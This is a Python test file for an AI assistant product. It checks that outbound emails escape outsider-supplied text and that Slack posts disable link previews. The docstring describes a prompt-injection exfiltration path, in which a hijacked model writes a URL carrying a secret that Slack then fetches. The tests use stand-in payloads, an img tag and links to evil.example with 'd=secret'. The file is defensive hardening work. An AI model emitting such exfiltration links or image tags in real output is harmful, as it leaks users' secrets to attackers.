"""Outbound channels never carry live HTML or link previews of injected text.

Cubie reads outside text (email, calendar invites, web pages) and some of what
it writes back goes out through our own mailbox and our own Slack bot. Two
leaks are pinned here (docs/prompt_injection_hardening.md, P5 and P6):

* a system email that interpolates a string an outsider or the model wrote
  (a calendar event title, a company name) must escape it, or the outsider
  puts an ``<img>`` that phones home, or a phishing link, inside mail that
  comes from the company's own domain;
* a Slack post must not ask Slack to preview links, or Slack's servers fetch
  ``https://evil/?d=<secret>`` the moment a hijacked model writes it.

The scheduled-task email and the document-share email are pinned next to
their own fixtures (test_scheduled_tasks_delivery.py, test_generated_docs.py).
Nothing here leaves the process.
"""

from __future__ import annotations

from types import SimpleNamespace

from backend.services.slack_service import SlackBotClient

PAYLOAD = '<img src="https://evil.example/x?d=secret">'

POST = "backend.services.slack_service.httpx.post"
GET = "backend.services.slack_service.httpx.get"


class _Resp:
    def __init__(self, data):
        self.status_code = 200
        self._data = data
        self.headers = {}

    def json(self):
        return self._data


def _slack_transport(monkeypatch):
    """Answer every Slack call with a success; record what was posted."""
    posts: list[dict] = []

    def fake_post(url, **kwargs):
        posts.append({"url": url, **kwargs})
        if url.endswith("conversations.open"):
            return _Resp({"ok": True, "channel": {"id": "D1"}})
        return _Resp({"ok": True, "ts": "1.1"})

    def fake_get(url, **kwargs):
        return _Resp({"ok": True, "user": {"id": "U1"}})

    monkeypatch.setattr(POST, fake_post)
    monkeypatch.setattr(GET, fake_get)
    return posts


def _chat_posts(posts):
    return [p["json"] for p in posts if p["url"].endswith("chat.postMessage")]


# ── P6: Slack link previews ──────────────────────────────────────────────────


def test_a_channel_post_asks_slack_not_to_preview_anything(monkeypatch):
    posts = _slack_transport(monkeypatch)

    SlackBotClient(bot_token="xoxb-test").post_message(
        "C1", text="see https://evil.example/?d=secret"
    )

    (body,) = _chat_posts(posts)
    # Sent explicitly, not left out: Slack's own default previews media links.
    assert body["unfurl_links"] is False
    assert body["unfurl_media"] is False


def test_a_dm_asks_slack_not_to_preview_anything(monkeypatch):
    posts = _slack_transport(monkeypatch)

    SlackBotClient(bot_token="xoxb-test").send_dm(
        "a@acme.example", text="see https://evil.example/?d=secret"
    )

    (body,) = _chat_posts(posts)
    assert body["unfurl_links"] is False
    assert body["unfurl_media"] is False


def test_a_caller_can_still_ask_for_previews_on_purpose(monkeypatch):
    posts = _slack_transport(monkeypatch)

    SlackBotClient(bot_token="xoxb-test").post_message(
        "C1", text="https://cubie.example.com", unfurl_links=True
    )

    (body,) = _chat_posts(posts)
    assert body["unfurl_links"] is True
    assert body["unfurl_media"] is False


# ── P5: system email HTML ────────────────────────────────────────────────────


def test_deep_prep_email_escapes_an_outside_inviters_event_title():
    """LIVE path: CUBIE_DEEP_PREP_EMAIL_AUTOSEND is on in dev, and whoever
    sends the calendar invite writes the event title."""
    from backend.routers.home import _deep_prep_email_html

    out = _deep_prep_email_html(f"Q4 sync {PAYLOAD}")

    assert "<img" not in out
    assert "&lt;img src=&quot;https://evil.example/x?d=secret&quot;&gt;" in out
    assert "Q4 sync" in out


def test_xray_email_escapes_the_company_name(monkeypatch):
    from rubik_core.xray import service as svc

    sent: dict = {}

    def fake_send(spec, **_kw):
        sent["spec"] = spec
        return SimpleNamespace(status="disabled", message_id=None, error=None)

    monkeypatch.setattr("rubik_core.xray.pdf.render_xray_pdf", lambda **_kw: b"%PDF")
    monkeypatch.setattr("rubik_core.tools.email_sender.send_email", fake_send)
    # The delivery-status write is best-effort; keep it off any database.
    monkeypatch.setattr(svc.persistence, "update_snapshot", lambda *a, **k: None)
    monkeypatch.setattr(svc, "SessionLocal", _NullSession)

    svc._deliver_deep_pdf(
        "snap-1",
        company_name=f"Acme {PAYLOAD}",
        signals={},
        sections={},
        requesting_user="bellison@acme.example",
        base_progress={},
    )

    html_body = sent["spec"].html_body
    assert "<img" not in html_body
    assert "&lt;img" in html_body
    assert "Acme" in html_body


class _NullSession:
    def __enter__(self):
        return None

    def __exit__(self, *_exc):
        return False
